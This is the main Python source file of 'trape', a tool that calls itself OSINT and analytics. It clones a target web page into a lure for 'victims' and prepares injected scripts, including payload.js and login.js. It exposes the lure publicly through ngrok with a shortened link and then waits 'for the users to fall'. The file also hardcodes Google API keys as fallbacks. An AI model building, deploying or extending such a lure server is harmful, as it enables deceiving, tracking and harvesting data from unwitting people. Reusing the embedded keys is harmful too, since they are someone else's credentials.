#!/usr/bin/env python
# -*- coding: utf-8 -*-
# **
#
#########
# trape #
#########
#
# trape depends of this file
# For full copyright information this visit: https://github.com/jofpin/trape
#
# Copyright 2018 by Jose Pino (@jofpin) / <jofpin@gmail.com>
# **
import time
import json
import urllib
import argparse
import socket
import sys
import os
from core.utils import utils
from core.ngrok import Ngrok
import subprocess
import requests


class Trape(object):
    def __init__(self):
        self.name_trape = "Trape"
        self.version = "2.1"
        self.stats_path = "ngrok"
        self.home_path = utils.generateToken(18)
        self.logout_path = utils.generateToken(6)
        self.remove_path = utils.generateToken(14)
        self.injectURL = utils.generateToken(12) + '.js'
        self.stats_key = utils.generateToken(24)
        self.date_start = time.strftime("%Y-%m-%d - %H:%M:%S")
        self.localIp = '127.0.0.1'
        self.nGrokUrl = ''
        self.type_lure = 'global'
        self.app_port = None
        self.url_to_clone = ""
        self.victim_path = ""
        self.ngrok = ""

        self.JSFiles = (
            {"path": "base.js", "src": utils.generateToken(12)},
            {"path": "libs.min.js", "src": utils.generateToken(12)},
            {"path": "login.js", "src": utils.generateToken(12)},
            {"path": "payload.js", "src": utils.generateToken(12)},
            {"path": "trape.js", "src": utils.generateToken(12)},
            {"path": "vscript.js", "src": utils.generateToken(12)},
            {"path": "custom.js", "src": utils.generateToken(12)},)
        self.CSSFiles = ({"path": "/static/img/favicon.ico", "src": utils.generateToken(12)},
                         {"path": "/static/img/favicon.png", "src": utils.generateToken(12)},
                         {"path": "/static/css/base-icons.css", "src": utils.generateToken(12)},
                         {"path": "/static/css/styles.css", "src": utils.generateToken(12)},
                         {"path": "/static/css/normalize.min.css", "src": utils.generateToken(12)},
                         {"path": "/static/css/services-icons.css", "src": utils.generateToken(12)},)

    def load_config(self):
        if not utils.checkInet():
            exit(1)

        if not (os.path.exists("trape.config")):
            utils.trape_config()
        config_trape = json.load(open("trape.config"))
        self.ngrok = config_trape['ngrok_token']
        self.gmaps = config_trape['gmaps_api_key']
        self.ipinfo = config_trape['ipinfo_api_key']
        if self.gmaps == '':
            print("Google Maps Key Missing")
            exit(1)
        self.googl = config_trape['gshortener_api_key']
        if self.googl == '':
            self.googl = 'AIzaSyDHMDTOGo9L1OBl5vRxOVM6vpXOXVp5jCc'

    def process_arguments(self):  # TODO: Refactor this
        parser = argparse.ArgumentParser("python trape.py -u <<Url>> -p <<Port>>")
        parser.add_argument('-u', '--url', dest='url', help='Put the web page url to clone')
        parser.add_argument('-p', '--port', dest='port', help='Insert your port')
        parser.add_argument('-ak', '--accesskey', dest='accesskey', help='Insert your custom key access')
        parser.add_argument('-l', '--local', dest='local', help='Insert your home file')
        parser.add_argument('-n', '--ngrok', dest='ngrok', help='Insert your ngrok Authtoken', action='store_true')
        parser.add_argument('-ic', '--injectcode', dest='injc', help='Insert your custom REST API path')
        parser.add_argument('-ud', '--update', dest='update', action='store_true', default=False,
                            help='Update trape to the latest version')

        options = parser.parse_args()

        # Check current updates

        if options.update:
            utils.Go("\033[H\033[J")
            utils.Go("Updating..." + " " + utils.Color['blue'] + "trape" + utils.Color['white'] + "..." + "\n")
            subprocess.check_output(["git", "reset", "--hard", "origin/master"])
            subprocess.check_output(["git", "pull"])
            utils.Go("Trape Updated... Please execute again...")
            sys.exit(0)

        if options.url is None:
            utils.Go("\033[H\033[J")
            utils.Go("----------------------------------------------")
            utils.Go("" + " " + utils.Color['redBold'] + "TRAPE" + utils.Color['white'] + " {" + utils.Color[
                'yellowBold'] + "stable" + utils.Color['white'] + "}" + utils.Color[
                         'white'] + " - " + "Osint and analytics tool" + " " + "<" + utils.Color['white'])
            utils.Go("----------------------------------------------")
            utils.Go("| v" + utils.Color['redBold'] + self.version + utils.Color['white'] + " |")
            utils.Go("--------" + "\n")
            utils.Go(
                utils.Color['whiteBold'] + "[" + utils.Color['greenBold'] + "!" + utils.Color['whiteBold'] + "]" + " " +
                utils.Color['white'] + "Enter the information requested below to complete the execution" + utils.Color[
                    'white'])
            utils.Go("")

            options.url = input(
                utils.Color['blueBold'] + "-" + utils.Color['white'] + " Enter a URL to generate the lure" + " " +
                utils.Color['yellow'] + ":~> " + utils.Color['white'])

        if options.port is None:
            options.port = input(utils.Color['blueBold'] + "-" + utils.Color[
                'white'] + " What is your port to generate the server?" + " " + utils.Color['yellow'] + ":~> " +
                                 utils.Color['white'])

        while utils.checkPort(int(options.port)) == False:
            utils.Go("\033[H\033[J")
            utils.Go("----------------------------------------------")
            utils.Go("" + " " + utils.Color['redBold'] + "TRAPE" + utils.Color['white'] + " {" + utils.Color[
                'yellowBold'] + "stable" + utils.Color['white'] + "}" + utils.Color[
                         'white'] + " - " + "Osint and analytics tool" + " " + "<" + utils.Color['white'])
            utils.Go("----------------------------------------------")
            utils.Go("\n")
            utils.Go(utils.Color['whiteBold'] + "[" + utils.Color['redBold'] + "x" + utils.Color['whiteBold'] + "]" +
                     utils.Color['redBold'] + " " + "ERROR:" + " " + utils.Color[
                         'whiteBold'] + "The port: " + options.port + utils.Color[
                         'white'] + " " + "is not available, It was previously used (" + utils.Color[
                         'yellow'] + "Use another port" + utils.Text['end'] + ")" + "\n\n")
            options.port = input(utils.Color['blueBold'] + "-" + utils.Color[
                'white'] + " What is your port to generate the server?" + " " + utils.Color['yellow'] + ":~> " +
                                 utils.Color['white'])
            options.url = input(
                utils.Color['blueBold'] + "-" + utils.Color['white'] + " Enter a URL to generate the lure" + " " +
                utils.Color['yellow'] + ":~> " + utils.Color['white'])

        utils.Go("")
        utils.Go(utils.Color['greenBold'] + "-" + utils.Color['white'] + " Successful " + utils.Color[
            'greenBold'] + "startup" + utils.Color['white'] + ", get lucky on the way!" + utils.Color['white'])
        utils.Go("")
        time.sleep(0.1)

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        self.localIp = s.getsockname()[0]
        s.close()
        self.app_port = int(options.port)
        self.url_to_clone = str(options.url)
        if self.url_to_clone[0:4] != 'http':
            self.url_to_clone = 'http://' + self.url_to_clone
        self.victim_path = options.url.replace("http://", "").replace("https://", "")

        # TODO: maybe put in seperate method start ngrok
        self.ngrok = options.ngrok if options.ngrok else self.ngrok
        if self.ngrok == '':
            utils.Go("\033[H\033[J")
            self.ngrok = input(
                "What is your nGrok token?" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
        Ngrok(self.ngrok, self.app_port)

        # Custom name of REST API
        if (options.injc):
            self.injectURL = options.injc

        # Custom access token
        if (options.accesskey):
            self.stats_key = options.accesskey  # and start ngrok

    # Design principal of the header of trape
    def header(self):
        # Principal header of tool
        utils.banner()

        # Update verification
        changeLog = requests.get("https://raw.githubusercontent.com/jofpin/trape/master/version.txt", timeout=4)
        changeLog = changeLog.text.split(" ")[1]
        changeLog = changeLog.strip()
        if changeLog != self.version:
            utils.Go(utils.Color['white'] + "\t" + utils.Color['yellowBold'] + "@" + utils.Color['white'] + "-" +
                     utils.Color['blue'] + "=" + utils.Color['white'] + "[" + utils.Color[
                         'whiteBold'] + " " + "UPDATES:" + " " + utils.Color[
                         'yellowBold'] + "NEW VERSION IS AVAILABLE: " + utils.Color['white'] + "v" + utils.Color[
                         'redBold'] + changeLog + utils.Color['white'] + " " + "(install changes)")
            utils.Go("")
        else:
            utils.Go(utils.Color['white'] + "\t" + utils.Color['yellowBold'] + "@" + utils.Color['white'] + "-" +
                     utils.Color['blue'] + "=" + utils.Color['white'] + "[" + utils.Color[
                         'whiteBold'] + " " + "UPDATES:" + " " + utils.Color[
                         'greenBold'] + "RUNNING RECENT VERSION" + utils.Color['white'])
            utils.Go("")

        # Local information vars
        utils.Go(utils.Color['white'] + "\t" + utils.Color['whiteBold'] + "LOCAL INFORMATION" + utils.Text['end'])
        utils.Go("\t" + "-------------------")
        utils.Go(
            utils.Color['white'] + "\t" + utils.Color['green'] + ">" + utils.Color['white'] + "-" + utils.Color[
                'blue'] + "=" + utils.Color['white'] + "[" + utils.Color['white'] + " Lure for the users: " +
            utils.Color['blue'] + 'http://' + self.localIp + ':' + str(self.app_port) + '/' + self.victim_path)
        utils.Go(
            utils.Color['white'] + "\t" + utils.Color['green'] + ">" + utils.Color['white'] + "-" + utils.Color[
                'blue'] + "=" + utils.Color['white'] + "[" + utils.Color['white'] + " Your REST API path: " +
            utils.Color['blue'] + 'http://' + self.localIp + ':' + str(self.app_port) + '/' + self.injectURL +
            utils.Color['white'])
        utils.Go(
            utils.Color['white'] + "\t" + utils.Color['green'] + ">" + utils.Color['white'] + "-" + utils.Color[
                'blue'] + "=" + utils.Color['white'] + "[" + utils.Color['white'] + " Control Panel Link: " +
            utils.Color['blue'] + "http://127.0.0.1:" + utils.Color['blue'] + str(
                self.app_port) + '/' + self.stats_path)
        utils.Go(
            utils.Color['white'] + "\t" + utils.Color['green'] + ">" + utils.Color['white'] + "-" + utils.Color[
                'blue'] + "=" + utils.Color['white'] + "[" + utils.Color['white'] + " Your Access key: " +
            utils.Color['blue'] + self.stats_key + utils.Color['white'])
        utils.Go("")
        if self.ngrok != '':
            if self.googl == '':
                self.googl = 'AIzaSyCPzcppCT27KTHnxAIQvYhtvB_l8sKGYBs'
            try:
                opener = urllib.request.build_opener()
                pLog = 4040
                time.sleep(2)
                ngrokStatus = str(opener.open('http://127.0.0.1:' + str(pLog) + '/api/tunnels').read()).replace(
                    '\n', '').replace(' ', '')
                ngrokUrlPos = ngrokStatus.find('ngrok.io')
                if ngrokUrlPos <= 0:
                    # time.sleep(4)
                    ngrokStatus = str(opener.open('http://127.0.0.1:' + str(pLog) + '/api/tunnels').read()).replace(
                        '\n', '').replace(' ', '')
                    ngrokUrlPos = ngrokStatus.find('ngrok.io')
                if ngrokUrlPos >= 0:
                    ngrokStatus = ngrokStatus[ngrokUrlPos - 25:ngrokUrlPos + 28]
                    ngrokUrlPos = ngrokStatus.find('http')
                    ngrokUrlPos2 = ngrokStatus.find('.io')
                    ngrokStatus = ngrokStatus[ngrokUrlPos: ngrokUrlPos2] + '.io'
                    utils.Go(
                        utils.Color['white'] + "\t" + utils.Color['whiteBold'] + "PUBLIC INFORMATION" + utils.Text[
                            'end'])
                    utils.Go("\t" + "-------------------")
                    r = utils.gShortener(self.googl, ngrokStatus.replace('https', 'http') + '/' + self.victim_path)
                    self.nGrokUrl = ngrokStatus.replace('https', 'http')
                    utils.Go(
                        utils.Color['white'] + "\t" + utils.Color['yellow'] + ">" + utils.Color['white'] + "-" +
                        utils.Color['blue'] + "=" + utils.Color['white'] + "[" + utils.Color[
                            'white'] + " Public lure: " + utils.Color[
                            'blue'] + self.nGrokUrl + '/' + self.victim_path + utils.Color['white'])
                    utils.Go(
                        utils.Color['white'] + "\t" + utils.Color['yellow'] + ">" + utils.Color['white'] + "-" +
                        utils.Color['blue'] + "=" + utils.Color['white'] + "[" + utils.Color[
                            'white'] + " Control Panel link: " + utils.Color['blue'] + ngrokStatus.replace('https',
                                                                                                           'http') + '/' + self.stats_path +
                        utils.Color['white'])
                else:
                    utils.Go(utils.Color['red'] + "\t" + utils.Color['green'] + "-" + utils.Color['white'] + "--" +
                             utils.Color['red'] + "=" + utils.Color['white'] + "[" + utils.Color[
                                 'white'] + " We can't connect with nGrok " + utils.Color['white'])
            except Exception as e:
                utils.Go(
                    utils.Color['white'] + "[" + utils.Color['redBold'] + "x" + utils.Color['whiteBold'] + "]" +
                    utils.Color['redBold'] + " " + "ERROR: " + " " + utils.Color['white'] + e.reason)
                utils.Go(utils.Color['red'] + "\t" + utils.Color['green'] + "-" + utils.Color['white'] + "--" +
                         utils.Color['red'] + "=" + utils.Color['white'] + "[" + utils.Color[
                             'white'] + " We can't connect with nGrok " + utils.Color['white'])
        utils.Go("\n" + utils.Color['white'])
        utils.Go(
            utils.Color['white'] + "[" + utils.Color['greenBold'] + ">" + utils.Color['white'] + "]" + utils.Color[
                'whiteBold'] + " " + "Start time:" + " " + utils.Color['white'] + self.date_start)
        utils.Go(
            utils.Color['white'] + "[" + utils.Color['greenBold'] + "?" + utils.Color['white'] + "]" + utils.Color[
                'white'] + " " + "Do not forget to close " + self.name_trape + ", after use. Press Control C" + " " +
            utils.Color['white'] + '\n')
        utils.Go(
            utils.Color['white'] + "[" + utils.Color['greenBold'] + "¡" + utils.Color['white'] + "]" + utils.Color[
                'white'] + " " + "Waiting for the users to fall..." + "\n")

    # Create config file

    def injectCSS_Paths(self, code):
        code = code.replace("[FAVICON_HREF]", self.CSSFiles[0]['src'])
        code = code.replace("[FAVICON_PNG_HREF]", self.CSSFiles[1]['src'])
        code = code.replace("[BASE_ICONS_HREF]", self.CSSFiles[2]['src'])
        code = code.replace("[STYLES_HREF]", self.CSSFiles[3]['src'])
        code = code.replace("[NORMALIZE_HREF]", self.CSSFiles[4]['src'])
        code = code.replace("[SERVICES_ICONS_HREF]", self.CSSFiles[5]['src'])
        code = code.replace('[OWN_API_KEY_HERE]', self.gmaps)
        code = code.replace('[TRAPE_SRC]', self.JSFiles[4]['src'])
        code = code.replace('[LIBS_SRC]', self.JSFiles[1]['src'])
        return code


